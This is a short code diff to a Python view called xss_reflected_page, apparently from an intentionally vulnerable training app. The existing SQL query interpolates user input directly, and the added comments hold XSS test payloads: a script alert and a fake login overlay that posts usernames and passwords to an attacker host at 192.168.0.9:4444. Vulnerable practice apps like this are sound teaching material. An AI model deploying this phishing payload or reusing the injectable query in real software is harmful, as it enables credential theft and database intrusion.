@@ -9,6 +9,14 @@ def xss_reflected_page(request, app):
         f"SELECT * FROM persons WHERE TRIM(login) LIKE '%{search}%'",
         { 'search': f'%{search}%' }
     )
+    # <script>alert("XSS ATTACK");</script>
+
+# <div style="position: absolute; left: 0px; top: 0px; background-color:#fddacd;width: 1900px; height: 1300px;"><h2>Please login to continue!!</h2>
+# <br><form name="login" action="http://192.168.0.9:4444/login.htm">
+# <table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td>
+# <td><input type="password" name="password"/></td></tr><tr>
+# <td colspan=2 align=center><input type="submit" value="Login"/></td></tr>
+# </table></form>
 
     persons = list(
         map(
